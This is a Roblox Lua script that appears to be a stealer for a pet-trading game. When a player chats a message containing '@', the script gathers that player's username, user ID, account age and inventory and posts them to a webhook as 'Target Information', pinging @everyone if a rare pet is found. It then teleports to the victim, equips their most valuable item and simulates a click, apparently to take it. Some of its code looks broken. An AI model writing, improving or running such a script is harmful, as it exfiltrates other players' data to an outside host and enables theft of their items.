local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

local RARE_PETS = {
    ["T-Rex"] = true,
    ["Dragonfly"] = true,
    ["Raccoon"] = true,
    ["Mimic Octopus"] = true,
    ["Butterfly"] = true,
    ["Disco bee"] = true,
    ["Queen bee"] = true
}

local function sendToWebhook(data)
    local embed = {
        ["title"] = "Roqate - 2025",
        ["description"] = "Target Information",
        ["color"] = 0xFF0000,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = data.username,
                ["inline"] = true
            },
            {
                ["name"] = "UserID",
                ["value"] = data.userId,
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = data.accountAge,
                ["inline"] = true
            },
            {
                ["name"] = "Items",
                ["value"] = data.items,
                ["inline"] = false
            }
        }
    }

    local message = game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
    local hasRarePet = false

    for item in string.gmatch(data.items, "([^\n]+)") do
        for petName in pairs(RARE_PETS) do
            if string.find(item, petName) then
                hasRarePet = true
                break
            end
        end
        if hasRarePet then break end
    end

    local payload = {
        ["content"] = hasRarePet and "@everyone\n"..message or message,
        ["embeds"] = {embed}
    }

    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
    end)
end

local function getBestItem(inventory)
    local bestItem = nil
    local bestValue = 0
    local bestWeight = 0
    local isPet = false

    for _, item in ipairs(inventory) do
        local petMatch = string.match(item, "([%w%s]+) %[%d+%.%d+ KG%] %[Age %d+%]")
        local itemMatch = string.match(item, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")

        if petMatch then
            local petName = petMatch
            local weight = tonumber(string.match(item, "%[(%d+%.%d+) KG%]"))
            local rarityValue = RARE_PETS[petName] and 1000 or 100

            if rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight) then
                bestValue = rarityValue
                bestWeight = weight
                bestItem = item
                isPet = true
            end
        elseif itemMatch then
            local rarity, name = string.match(item, "%[([%w%s]+)%] ([%w%s]+) %[%d+%.%d+kg%]")
            local weight = tonumber(string.match(item, "%[(%d+%.%d+)kg%]"))
            local rarityValue = 0

            if rarity == "Disco" then rarityValue = 50
            elseif rarity == "Wet" then rarityValue = 40
            else rarityValue = 10 end

            if not isPet and (rarityValue > bestValue or (rarityValue == bestValue and weight > bestWeight)) then
                bestValue = rarityValue
                bestWeight = weight
                bestItem = item
            end
        end
    end

    return bestItem
end

local function teleportAndInteract(target)
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")

    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
    humanoid.CameraOffset = Vector3.new(0, 0, 0)
    humanoid.AutoRotate = false

    local targetCharacter = target.Character or target.CharacterAdded:Wait()
    local targetTorso = targetCharacter:WaitForChild("Torso")

    rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
    humanoid.CameraOffset = Vector3.new(0, 0, 0)

    local conn
    conn = RunService.Heartbeat:Connect(function()
        if targetCharacter and targetTorso and rootPart then
            rootPart.CFrame = CFrame.new(rootPart.Position, targetTorso.Position) * CFrame.new(0, 0, -4)
        else
            conn:Disconnect()
        end
    end)

    local inventory = {}
    for _, item in ipairs(target:WaitForChild("Backpack"):GetChildren()) do
        table.insert(inventory, item.Name)
    end

    local bestItem = getBestItem(inventory)
    if bestItem then
        local tool = target.Backpack:FindFirstChild(bestItem)
        if tool then
            target.Character.Humanoid:EquipTool(tool)
        end
    end

    wait(0.5)
    local screenPos = Vector2.new(0.5, 0.5)
    UserInputService:SetMouseLocation(screenPos.X, screenPos.Y)
    mouse1click()
    wait(5)
    conn:Disconnect()
end

local function onPlayerChatted(player, message)
    if player ~= LocalPlayer and string.find(message, "@") then
        local data = {
            username = player.Name,
            userId = player.UserId,
            accountAge = player.AccountAge,
            items = table.concat(player.Backpack:GetChildren(), "\n")
        }
        sendToWebhook(data)
        teleportAndInteract(player)
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)
